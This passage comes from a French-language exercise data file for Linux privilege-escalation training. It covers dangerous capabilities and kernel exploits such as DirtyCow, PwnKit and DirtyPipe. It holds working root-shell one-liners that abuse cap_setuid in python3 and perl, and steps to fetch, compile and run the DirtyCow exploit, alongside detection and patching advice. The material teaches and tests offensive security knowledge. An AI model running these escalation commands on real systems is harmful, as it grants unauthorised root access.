      "Si perl a cap_setuid : `perl -e 'use POSIX; POSIX::setuid(0); exec \"/bin/bash\";'` — même principe"
    ],
    fileSystem: {
      'linux_capabilities.txt': `Capabilities Linux dangereuses
================================

COMMENT ÇA MARCHE
  Les capabilities décomposent les privilèges root en unités distinctes.
  Au lieu d'un SUID root global, un binaire reçoit seulement ce dont il a besoin.
  Notation : cap_setuid+ep
    e = effective (active à l'exécution)
    p = permitted (dans le set permis)
    i = inherited (héritée par les fils)

CAPABILITIES CRITIQUES

cap_setuid / cap_setgid
  Permet setuid(0) ou setgid(0) sans être root
  Binaires courants : python3, perl, node
  Exploitation : python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

cap_dac_override
  Bypasse les vérifications de permissions DAC (lecture/écriture/exécution)
  Peut lire /etc/shadow, écrire dans /etc/passwd
  Exploitation : binaire avec cap_dac_override peut cat /etc/shadow

cap_net_raw
  Création de raw sockets, sniffing réseau
  tcpdump l'utilise légitimement
  Exploitation : sniffing de credentials en clair sur le réseau

cap_sys_ptrace
  Attachement ptrace à n'importe quel processus
  Injection de code dans un processus root → exécution root
  Exploitation : injecter shellcode dans un processus root via ptrace

cap_sys_admin
  Très large : mount, pivot_root, manipulation namespaces
  Souvent lié à Docker/container escapes

cap_chown
  Changer le propriétaire de n'importe quel fichier
  Exploitation : chown user:user /etc/shadow, puis lire/écrire

cap_fowner
  Bypasse les vérifications de propriétaire pour les permissions
  Peut chmod n'importe quel fichier

RÈGLE GÉNÉRALE
  Si un binaire interactif (python, perl, ruby, node) a cap_setuid+ep
  → escalade root immédiate et triviale`,

      'getcap_example_output.txt': `Exemple de sortie getcap -r / 2>/dev/null
==========================================

/usr/bin/ping = cap_net_raw+ep
  → Normal, ping en a besoin pour les ICMP raw sockets

/usr/bin/tcpdump = cap_net_raw+ep
  → Normal, tcpdump sniffe le réseau

/usr/bin/python3.8 = cap_setuid+ep
  ← DANGEREUX ! python3 peut passer en UID 0

/usr/bin/perl = cap_setuid+ep
  ← DANGEREUX ! perl peut passer en UID 0

/usr/sbin/exim4 = cap_setuid+ep
  ← Souvent exploitable selon la version

Exploitation de python3 avec cap_setuid :
  /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  root@target:~#

Exploitation de perl avec cap_setuid :
  /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
  root@target:~#

Enlever une capability (en tant que root) :
  setcap -r /usr/bin/python3.8
  → supprime toutes les capabilities du binaire`
    },
    validation: [
      { type: 'command', value: 'getcap', description: 'Lister les capabilities avec getcap' }
    ],
    story: "🎭 Les capabilities sont une bonne idée mal appliquée. Donner cap_setuid à Python pour éviter le SUID root, c'est donner les clés du royaume à quiconque peut exécuter Python. GTFOBins et les capabilities font une combinaison redoutable que LinPEAS détecte automatiquement."
  },

  {
    id: 140,
    title: "DirtyCow & Kernel Exploits",
    difficulty: 'advanced',
    category: "Privilege Escalation",
    objective: "Comprendre les exploits noyau et leur détection",
    description: "`uname -a` révèle la version exacte du noyau Linux, première étape pour chercher des CVE d'escalade de privilèges. DirtyCow (CVE-2016-5195) est l'un des exploits kernel les plus connus : une race condition dans le mécanisme copy-on-write permettait à tout utilisateur non privilégié d'écrire dans des fichiers root read-only, conduisant à une escalade root garantie sur Linux < 4.8.3. Les exploits kernel sont souvent en C et se compilent avec `gcc exploit.c -o exploit -pthread`. Ces exploits sont puissants mais risqués : un bug peut crasher le système.",
    commands: ['uname', 'searchsploit'],
    hints: [
      "uname -a pour la version du noyau, puis `searchsploit linux kernel [version]` — filtre avec `grep -v 'dos\\|DoS'` pour ignorer les dénis de service",
      "Pour DirtyCow (kernel 2.6.22 à 4.8.3) : `searchsploit dirtycow` puis `searchsploit -m 40611` — compile avec `gcc 40611.c -o cowroot -pthread` et exécute",
      "Utilise linux-exploit-suggester : `./linux-exploit-suggester.sh` ou `./les.sh --uname 'Linux target 4.15.0'` pour avoir une liste des CVE applicables avec score de probabilité"
    ],
    fileSystem: {
      'kernel_exploits_history.txt': `Historique des exploits kernel Linux célèbres
===============================================

CVE-2016-5195 — DirtyCow (octobre 2016)
  Kernel : 2.6.22 → 4.8.3 (9 ans de vulnérabilité !)
  Type   : Race condition dans copy-on-write (mmap)
  Impact : Écriture dans fichiers read-only → root garanti
  Exploit: dirtycow.ninja — surécrit /etc/passwd en mémoire
  Fix    : Kernel 4.8.3, patchs disponibles pour toutes distros

CVE-2017-1000112 — UFO / UDP fragmentation
  Kernel : < 4.13
  Type   : Memory corruption dans le stack réseau UDP
  Impact : Privilege escalation locale → root

CVE-2021-4034 — PwnKit (polkit, janvier 2022)
  Kernel : Toutes versions (faille dans pkexec, pas le kernel)
  Type   : Out-of-bounds write dans polkit/pkexec
  Impact : Root sur toute distro Linux avec polkit installé
  Exploit: https://github.com/berdav/CVE-2021-4034
  Fix    : polkit 0.120+

CVE-2021-3156 — Baron Samedit (sudo, janvier 2021)
  Kernel : N/A (faille dans sudo)
  Version: sudo 1.8.2 → 1.9.5p1
  Type   : Heap-based buffer overflow dans sudo
  Impact : Root sans connaître le mot de passe sudo
  Fix    : sudo 1.9.5p2

CVE-2022-0847 — DirtyPipe (mars 2022)
  Kernel : 5.8 → 5.16.11
  Type   : Bug dans le mécanisme pipe (splice)
  Impact : Écriture dans fichiers read-only via pipe → root
  Note   : Très similaire à DirtyCow, découvert 6 ans après
  Fix    : Kernel 5.16.11, 5.15.25, 5.10.102

CVE-2023-0386 — OverlayFS (avril 2023)
  Kernel : < 6.2
  Type   : SUID bit via OverlayFS sur fichiers montés
  Impact : Privilege escalation via fuse + overlayfs
  Fix    : Kernel 6.2

CVE-2024-1086 — Netfilter use-after-free (mars 2024)
  Kernel : 5.14 → 6.6 (LTS)
  Type   : Use-after-free dans nf_tables
  Impact : Privilege escalation → root, container escape
  Fix    : Kernel 6.8.1`,

      'detection_guide.txt': `Détecter la vulnérabilité aux kernel exploits
===============================================

ÉTAPE 1 — Identifier la version du kernel
  uname -a
  uname -r
  cat /proc/version
  hostnamectl | grep Kernel

  Exemple : Linux target 4.15.0-112-generic #113-Ubuntu SMP

ÉTAPE 2 — Chercher les CVE applicables

  Méthode 1 : linux-exploit-suggester
  ./les.sh --uname "\$(uname -a)"
  Résultat : liste CVE avec probabilité d'exploitation

  Méthode 2 : searchsploit
  searchsploit linux kernel 4.15 local
  searchsploit linux privilege escalation 2020 2021 2022

  Méthode 3 : LinPEAS (automatique)
  Section "Kernel exploits" en rouge si version vulnérable

ÉTAPE 3 — Compiler et utiliser un exploit C

  # Exemple DirtyCow
  searchsploit -m 40611       # copier l'exploit
  gcc 40611.c -o cowroot -pthread -lcrypt
  ./cowroot
  # → prompt root

  ATTENTION : risque de crash kernel !
  Toujours tester en lab avant prod.
  Avoir un snapshot/backup de la VM cible.

ÉTAPE 4 — Pourquoi patcher est critique

  Un kernel non patché est vulnérable à toutes les CVE
  publiées depuis sa version. DirtyCow fonctionne encore
  sur des systèmes embarqués, IoT, vieilles VMs de prod.

  Commande de vérification de mises à jour :
    apt list --upgradable 2>/dev/null | grep linux-image
    yum check-update kernel
    dnf update kernel --check`
    },
    validation: [
      { type: 'command', value: 'uname', description: 'Obtenir la version du kernel' },
      { type: 'command', value: 'searchsploit', description: 'Chercher des exploits kernel' }
    ],
    story: "💀 DirtyCow a existé dans le kernel Linux pendant 9 ans avant d'être découvert. 9 ans. Chaque serveur Linux du monde était vulnérable. Les exploits kernel sont les armes nucléaires du privesc : puissants, peu discriminants, et potentiellement destructeurs. `uname -a` + CVE search : le combo qui révèle si le système a des dettes techniques payables en root."
  }
];
